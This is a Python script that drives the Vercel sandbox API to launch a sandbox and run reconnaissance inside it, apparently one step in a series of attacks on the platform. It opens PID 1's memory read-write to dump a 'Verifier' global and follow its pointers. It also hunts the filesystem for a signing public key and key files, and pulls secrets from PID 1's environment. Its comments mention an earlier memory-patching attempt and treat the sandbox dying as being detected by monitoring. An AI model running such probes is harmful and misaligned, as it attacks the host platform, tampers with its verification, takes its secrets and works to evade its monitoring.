# 实验J203: A)dump 0xE9E010全局变量(Verifier状态) B)解引用追公钥 C)文件系统找key
# j202: 同一请求不同沙箱不同结果=I-cache概率实锤 -> 代码patch不可靠
# j202反汇编线索: NewVerifierFromBase64读[rip+0x663432]=0xE9E010(全局) 
# 本步: 纯侦察 - 1)0xE9E010值 2)解引用 3)grep文件系统找base64公钥
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=26000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj203"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, sys
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)

# PA: dump 0xE9E010 全局 (Verifier状态判断: 0=懒加载未创建, 非0=已创建)
p("CP", "PA")
G = 0xE9E010
b = read_at(G - 0x20, 0x80)
p("GLOBAL", hex(G), b.hex())
# 解引用: [G] = 指针?
import struct
v0 = struct.unpack("<Q", read_at(G, 8))[0]
v1 = struct.unpack("<Q", read_at(G + 8, 8))[0]
p("PTR0", hex(v0), "PTR1", hex(v1))
# 若是指针则dump目标
for v in (v0, v1):
    if 0x400000 < v < 0x3000000 or 0xf0000000000 < v < 0x1000000000000:
        try:
            t = read_at(v, 0x80)
            s = "".join(chr(c) if 32 <= c < 127 else "." for c in t)
            p("DEREF", hex(v), t.hex(), repr(s))
        except Exception as e:
            p("DEREF_FAIL", hex(v), repr(e))

# PB: 文件系统找 key (base64公钥串)
p("CP", "PB")
p("LS_SHARE:")
for ln in os.popen("ls -la /run/vercel/share/ 2>&1").read().splitlines():
    p(" ", ln)
p("GREP_B64:")
os.system("grep -rls 'WVN8gckg' /run /etc /var /opt /srv /home /tmp 2>/dev/null | head -20")
p("GREP_DONE")
p("FIND_KEY:")
os.system("find /run /etc /var /opt -maxdepth 5 \\( -name '*key*' -o -name '*sign*' -o -name '*auth*' -o -name '*.pem' -o -name '*.pub' \\) 2>/dev/null | head -30")
p("FIND_DONE")
p("ENV1:")
os.system("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -i -E 'key|sign|auth|secret|verif' | head -20")
p("ENV_DONE")
p("done")
out = None
'''

st = run_cmd(sid, CODE, "J203", timeout=290)
time.sleep(2)
if st == "DEAD":
    print("\n!!! DEATH -> 侦察触发监控", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
